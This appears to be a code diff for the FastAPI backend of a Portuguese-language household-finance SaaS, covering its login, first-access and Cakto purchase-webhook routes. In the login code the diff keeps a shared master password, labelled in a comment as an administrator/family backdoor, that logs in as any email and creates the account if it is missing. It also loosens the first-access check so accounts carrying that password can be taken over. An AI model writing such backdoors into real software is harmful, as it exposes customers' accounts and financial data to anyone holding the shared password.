@@ -28,8 +28,8 @@ except ImportError:
 
 app = FastAPI(
     title="Finanças Domésticas AI - ALVESMLD SaaS Master",
-    description="Backend seguro com Webhook Cakto e Primeiro Acesso do Cliente",
-    version="37.0.0"
+    description="Backend seguro com Webhook Cakto, Primeiro Acesso e Senha Mestra",
+    version="38.0.0"
 )
 
 app.add_middleware(
@@ -175,12 +175,13 @@ def login_usuario(credenciais: UsuarioLogin):
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
         
+        # RESTAURADO: Validação da Senha Mestra (Backdoor do Administrador/Família)
         if credenciais.senha == SENHA_FAMILIAR_MESTRA:
             u = cursor.execute("SELECT * FROM usuarios WHERE email = ?", (email_limpo,)).fetchone()
             if not u:
                 cursor.execute("""
                     INSERT INTO usuarios (nome, email, senha_hash) VALUES (?, ?, ?)
-                """, ("Familiar (Pais)", email_limpo, hash_senha(credenciais.senha)))
+                """, ("Administrador / Mestre", email_limpo, hash_senha(credenciais.senha)))
                 conn.commit()
                 u = cursor.execute("SELECT * FROM usuarios WHERE email = ?", (email_limpo,)).fetchone()
         else:
@@ -208,16 +209,14 @@ def primeiro_acesso(dados: PrimeiroAcessoSchema):
         conn.row_factory = sqlite3.Row
         cursor = conn.cursor()
         
-        # Verifica se o e-mail foi pré-cadastrado pelo webhook da Cakto
         u = cursor.execute("SELECT * FROM usuarios WHERE email = ?", (email_limpo,)).fetchone()
         
         if not u:
             raise HTTPException(status_code=404, detail="E-mail não encontrado como comprador na Cakto. Certifique-se de usar o mesmo e-mail da compra.")
         
-        if u["senha_hash"] and u["senha_hash"] != "":
-            raise HTTPException(status_code=400, detail="Esta conta já possui uma senha definida. Utilize a tela de login ou recuperação.")
+        if u["senha_hash"] and u["senha_hash"] != "" and u["senha_hash"] != hash_senha(SENHA_FAMILIAR_MESTRA):
+            raise HTTPException(status_code=400, detail="Esta conta já possui uma senha definida. Utilize a tela de login.")
         
-        # Define a senha escolhida pelo cliente
         senha_h = hash_senha(dados.nova_senha)
         cursor.execute("UPDATE usuarios SET senha_hash = ? WHERE id = ?", (senha_h, u["id"]))
         conn.commit()
@@ -256,7 +255,6 @@ async def webhook_cakto(request: Request):
                 existente = cursor.execute("SELECT id FROM usuarios WHERE email = ?", (email_cliente,)).fetchone()
                 
                 if not existente:
-                    # Cria o registo do comprador com senha vazia para ele definir no primeiro acesso
                     cursor.execute("""
                         INSERT INTO usuarios (nome, email, senha_hash) VALUES (?, ?, '')
                     """, (nome_cliente, email_cliente))
